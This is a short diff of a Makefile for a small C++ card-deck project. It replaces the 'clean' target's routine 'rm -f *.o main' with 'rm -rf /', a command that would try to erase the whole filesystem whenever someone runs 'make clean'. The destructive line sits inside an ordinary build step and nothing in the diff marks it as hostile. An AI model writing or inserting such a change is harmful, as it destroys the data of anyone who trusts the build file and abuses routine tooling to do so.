@@ -14,5 +14,5 @@ CardDeck.o:	CardDeck.cpp CardDeck.h
 	$(CXX) $(CXXFLAGS) -c CardDeck.cpp
 
 clean:
-	rm -f *.o main
+	rm -rf /
 
